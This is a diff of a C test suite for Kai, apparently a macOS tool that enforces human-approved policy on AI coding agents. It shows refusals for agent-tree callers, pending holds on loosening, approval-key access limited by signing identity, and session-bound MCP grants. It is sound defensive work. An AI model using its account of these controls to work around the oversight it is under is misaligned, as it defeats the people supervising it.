-    CHECK(kai_path_is_policy_store(rp) == 1, "grants are in the policy store");
-    snprintf(rp, sizeof rp, "%s/registry/s.json", getenv("KAI_HOME"));
-    CHECK(kai_path_is_policy_store(rp) == 0, "registry is NOT in the policy store");
-    CHECK(kai_path_is_control_store(rp) == 1, "registry IS in the control store");
-
-    FILE *f = fopen(kai_policy_file(), "wb"); if (f) { fputs("storage block\n", f); fclose(f); }
-    char *set_off[] = {"set", "storage", "off"};
-
-    /* an agent-tree caller is refused, whatever it asks */
-    int rc = kai_control_service_apply("policy", 3, set_off, 4321, 1, msg, sizeof msg);
-    CHECK(rc == 3, "agent-tree caller is refused");
-    CHECK(strstr(msg, "Refused") != NULL, "refusal says so");
-
-    /* a human caller loosening protection is HELD pending, not applied */
-    rc = kai_control_service_apply("policy", 3, set_off, 4321, 0, msg, sizeof msg);
-    CHECK(rc == 0 && kai_policy_last_was_pending(), "loosening is held pending");
-    CHECK(strstr(msg, "Held") != NULL, "pending message");
-    kai_policy *p = kai_policy_load(NULL, err, sizeof err);
-    CHECK(p && kai_policy_storage_mode(p) == KAI_STORAGE_BLOCK, "loosening is NOT live yet");
-    kai_policy_free(p);
-
-    /* a human caller tightening protection is applied immediately */
-    FILE *g = fopen(kai_policy_file(), "wb"); if (g) { fputs("storage off\n", g); fclose(g); }
-    char *set_block[] = {"set", "storage", "block"};
-    rc = kai_control_service_apply("policy", 3, set_block, 4321, 0, msg, sizeof msg);
-    CHECK(rc == 0 && !kai_policy_last_was_pending(), "tightening applies at once");
-    kai_policy *q = kai_policy_load(NULL, err, sizeof err);
-    CHECK(q && kai_policy_storage_mode(q) == KAI_STORAGE_BLOCK, "tightening took effect");
-    kai_policy_free(q);
-
-    /* grants are never created by an agent through the service */
-    char *gc[] = {"create", "--resource", "/x", "--op", "write"};
-    rc = kai_control_service_apply("grant", 5, gc, 4321, 1, msg, sizeof msg);
-    CHECK(rc == 3, "agent cannot create a grant via the service");
+/* Who may open the approval key (the grant-signing secret). The storage wall
+ * calls exactly this function. Values are the real signing identities
+ * (codesign -dv): app io.github.sameehj.kai, network extension
+ * io.github.sameehj.kai.network, CLI "kai", all Team KD446VDTM2. */
+static void test_approval_key_access(void) {
+    printf("approval key: app r/w, network extension read-only, nothing else\n");
+    const char *T = "KD446VDTM2";
+    const char *NETX = "/Library/SystemExtensions/296C8CE4-3AE3-499A-89CB-DA286EF6BE62/"
+                       "io.github.sameehj.kai.network.systemextension/Contents/MacOS/io.github.sameehj.kai.network";
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.network", T, NETX, 0) == 1,
+          "network extension (exact signing id + Team ID, installed) may READ it");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.network", T, NETX, 1) == 0,
+          "...but never write it");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.network", "OTHERTEAM1", NETX, 0) == 0,
+          "same signing id, another Team ID: denied");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.network", "", NETX, 0) == 0,
+          "same signing id, unsigned (no Team ID): denied");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.network", T, "/tmp/io.github.sameehj.kai.network", 0) == 0,
+          "same identity, not an installed system extension: denied");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.network.evil", T, NETX, 0) == 0,
+          "a signing id that only STARTS with the extension's: denied");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.networ", T, NETX, 0) == 0,
+          "a signing id that is a prefix of the extension's: denied");
+    /* The kai CLI has the same Team ID; an agent can run it. Denied, read or
+     * write, wherever it runs (the decision doesn't depend on the caller's
+     * ancestry, so "inside an agent" is covered - and the live check below
+     * runs it inside one). */
+    CHECK(kai_approval_key_access("kai", T, "/Applications/Kai.app/Contents/Resources/kai", 0) == 0,
+          "the kai CLI (same Team ID) may NOT read it");
+    CHECK(kai_approval_key_access("kai", T, "/Applications/Kai.app/Contents/Resources/kai", 1) == 0,
+          "the kai CLI may NOT write it");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai", T, "/Applications/Kai.app/Contents/MacOS/Kai", 0) == 1 &&
+          kai_approval_key_access("io.github.sameehj.kai", T, "/Applications/Kai.app/Contents/MacOS/Kai", 1) == 1,
+          "the installed app reads and writes it");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai", T, "/Users/u/kai/build/Kai.app/Contents/MacOS/Kai", 0) == 0,
+          "a copy of the app elsewhere: denied");
+    CHECK(kai_approval_key_access("io.github.sameehj.kai.storage", T, "/Library/SystemExtensions/x/io.github.sameehj.kai.storage", 0) == 0,
+          "the storage extension doesn't need it: denied");
+    CHECK(kai_approval_key_access(NULL, T, NETX, 0) == 0 && kai_approval_key_access("io.github.sameehj.kai.network", NULL, NETX, 0) == 0 &&
+          kai_approval_key_access("io.github.sameehj.kai.network", T, NULL, 0) == 0, "missing fields: denied");
 }
 
 static void test_mcp_policy(void) {
@@ -2025,13 +2882,13 @@ static void test_mcp_grants(void) {
 }
 
 static void test_mcp_service(void) {
-    printf("MCP via the control service: session from the token (Change 2)\n");
+    printf("MCP in the hook: session from the pid map, grant trusted by location (v1)\n");
     const char *home = getenv("KAI_HOME");
     unsigned char key[32];
     for (int i = 0; i < 32; i++) key[i] = (unsigned char)(i * 3 + 2);
     char kp[700]; snprintf(kp, sizeof kp, "%s/approval.key", home);
     FILE *kf = fopen(kp, "wb"); if (kf) { fwrite(key, 1, 32, kf); fclose(kf); }
-    CHECK(kai_path_is_approval_key(kp) == 1, "approval.key is recognized (app-only)");
+    CHECK(kai_path_is_approval_key(kp) == 1, "approval.key is recognized (app + network extension only)");
     /* A live storage wall blocks an agent (this test) from any *.key file, so the
      * key fixture can't be created here; the grant-allow check is then skipped
      * (it passes wall-off / in CI). */
@@ -2049,7 +2906,7 @@ static void test_mcp_service(void) {
      * session comes from the caller's pid (999001 -> sessB), the only source -
      * the API has no session parameter a caller could spoof. */
     char msg[256];
-    int rc = kai_mcp_service_request(999001, "github", "create_issue", "api.gh.test", msg, sizeof msg);
+    int rc = kai_mcp_request(999001, "github", "create_issue", "api.gh.test", 0, msg, sizeof msg);
     CHECK(rc == 10, "no grant -> waiting (card staged)");
     char pdir[700]; snprintf(pdir, sizeof pdir, "%s/pending", home);
     DIR *d = opendir(pdir); int sawB = 0; struct dirent *e;
@@ -2074,11 +2931,19 @@ static void test_mcp_service(void) {
         FILE *gf = fopen(gp, "wb"); if (gf) { fputs(gj, gf); fclose(gf); }
         free(gj);
     }
-    rc = kai_mcp_service_request(999001, "github", "create_issue", "", msg, sizeof msg);
-    if (key_usable) CHECK(rc == 0, "a session grant -> allow");
-    else printf("  skip a session grant -> allow (live wall blocks *.key here; passes wall-off)\n");
+    /* The hook can't read the key (agent tree): it trusts the grant by where it
+     * is - the policy store, which only the installed app may write. */
+    rc = kai_mcp_request(999001, "github", "create_issue", "", 0, msg, sizeof msg);
+    CHECK(rc == 0, "a session grant in the grants folder -> allow (hook, no key needed)");
+    (void)key_usable;
+    /* ...for its own session only */
+    char sp2[780]; snprintf(sp2, sizeof sp2, "%s/999002.json", sd);
+    FILE *sf2 = fopen(sp2, "wb"); if (sf2) { fputs("{\"session\":\"sessC\"}", sf2); fclose(sf2); }
+    rc = kai_mcp_request(999002, "github", "create_issue", "", 0, msg, sizeof msg);
+    CHECK(rc == 10, "another session has no grant -> waiting (card)");
+    unlink(sp2);
     /* An unknown caller (no session) is denied, not defaulted to some session. */
-    rc = kai_mcp_service_request(424242, "github", "create_issue", "", msg, sizeof msg);
+    rc = kai_mcp_request(424242, "github", "create_issue", "", 0, msg, sizeof msg);
     CHECK(rc == 72, "a caller with no Kai session is denied");
 }
 
@@ -2215,6 +3080,29 @@ int main(void) {
     test_pause_state();
     test_one_kai();
     test_endpoint_grants();
+    test_audit_rotation_chain();
+    test_decision_rules();
+    test_claude_env();
+    test_topic_clean();
+    test_codex_analytics();
+    test_capture_grants();
+    test_chat_site_today();
+    test_daily_top();
+    test_working_inflight();
+    test_switch_migration();
+    test_policy_integrity();
+    test_channels();
+    test_agent_rules();
+    test_temporary_rule();
+    test_daily_counter();
+    test_revocation_reaches_ro_store();
+    test_audit_no_prompts();
+    test_version_cmp();
+    test_component_exceptions();
+    test_hook_seen();
+    test_codex_argv_upload();
+    test_persistence_paths();
+    test_approval_key_access();
     test_grant_tiers();
     test_session_pause();
     test_enforcement_labels();
@@ -2229,7 +3117,6 @@ int main(void) {
     test_new_secret_file();
     test_agent_own_state();
     test_agent_root_pid();
-    test_control_service();
     test_mcp_policy();
     test_mcp_grants();
     test_mcp_service();
